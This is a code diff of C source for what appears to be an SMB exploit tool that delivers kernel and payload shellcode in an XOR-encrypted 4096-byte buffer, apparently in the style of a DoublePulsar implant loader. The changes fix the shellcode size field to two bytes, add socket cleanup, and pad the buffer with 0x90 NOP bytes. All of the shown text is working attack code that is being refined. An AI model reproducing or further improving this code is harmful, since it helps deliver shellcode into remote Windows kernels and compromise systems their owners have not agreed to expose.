@@ -806,6 +806,8 @@ int main(int argc, char* argv[])
 		if (EntireShellcodeSize > 4096)
 		{
 			printf("Your shellcode is too large for our packet to send!\n");
+			closesocket(sock);
+			WSACleanup();
 			exit(1);
 		}
 
@@ -817,10 +819,10 @@ int main(int argc, char* argv[])
 		unsigned int difference = MaxShellcodeSize - EntireShellcodeSize;
 
 		//calculate the payload shellcode length
-		DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
+		WORD wPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
 
 		//remove the NULL terminator from the shellcode count
-		dwPayloadShellcodeSize -= 1;
+		wPayloadShellcodeSize -= 1;
 
 		memset(SMBDATA->smbdata, 0, 4096);
 		//hexDump(0, SMBDATA->smbdata, 4096);
@@ -829,13 +831,13 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)SMBDATA->smbdata, (unsigned char*)&kernel_shellcode, kernel_shellcode_size);
 
 		//copy the shellcode size after the kernel shellcode
-		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size, (unsigned char*)&dwPayloadShellcodeSize, 2);
+		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size, (unsigned char*)&wPayloadShellcodeSize, 2);
 
 		//copy payload shellcode to encrypted buffer
 		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size + 2, (unsigned char*)&shellcode, payload_shellcode_size);
 
-		memset(SMBDATA->smbdata + EntireShellcodeSize, 0x00, difference);
-		hexDump(0, SMBDATA->smbdata, 4096);
+		memset(SMBDATA->smbdata + EntireShellcodeSize, 0x90, difference);
+		//hexDump(0, SMBDATA->smbdata, 4096);
 
 		//encrypt the data with the XOR key
 		for (i = 0; i < 4096; i++)
